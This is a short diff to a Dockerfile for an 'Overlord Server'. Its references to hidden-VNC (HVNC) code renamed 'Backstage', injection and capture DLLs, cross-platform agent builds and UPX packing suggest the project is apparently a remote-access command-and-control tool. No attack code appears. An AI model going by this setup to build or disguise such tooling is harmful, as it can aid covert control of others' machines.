@@ -1,7 +1,7 @@
 # syntax=docker/dockerfile:1.7
 # Overlord Server Dockerfile (multi-stage)
 #
-# Stage 1 (builder): full apt toolchain to compile assets + HVNC DLLs.
+# Stage 1 (builder): full apt toolchain to compile assets + Backstage DLLs.
 # Stage 2 (runtime, slim): only what the server needs at startup. Cross-compile
 # toolchains (mingw, aarch64/armv7/musl, Android NDK, ldid, UPX) are downloaded
 # on first agent build by Overlord-Server/src/server/toolchain-manager.ts and
@@ -87,7 +87,7 @@ RUN --mount=type=cache,target=/root/.bun/install/cache \
 # Server source (Overlord-Server/dist-clients may carry pre-built MSVC DLLs from CI)
 COPY Overlord-Server/ ./
 
-# HVNC sources for the cross-compile fallback (used only if no pre-built MSVC DLL).
+# Backstage sources for the cross-compile fallback (used only if no pre-built MSVC DLL).
 COPY BackstageInjection/ ./BackstageInjection/
 COPY scripts/build-backstage-dll.sh ./scripts/
 COPY BackstageCapture/ ./BackstageCapture/
@@ -113,12 +113,15 @@ RUN if [ -f dist-clients/BackstageCapture.x64.dll ]; then \
 # Keep production build phases separate so BuildKit reports the exact slow or
 # failing phase and can cache each completed phase independently.
 RUN bun run build:css
+RUN bun run build:web:prod
 RUN bun run vendor
 RUN MINIFY_CONCURRENCY=4 bun run minify
 RUN bun run build:bundle
 
 RUN test "$(wc -l < ./public/index.html)" -lt 20 \
     && test "$(wc -l < ./public/assets/main.js)" -lt 50 \
+    && test -s ./public/assets/generated/shared-ui-settings.js \
+    && test ! -e ./public/assets/generated/shared-ui-settings.js.map \
     && test -s ./public/assets/tailwind.css \
     && test -d ./public/vendor/fontawesome \
     && test -s ./dist/index.js \
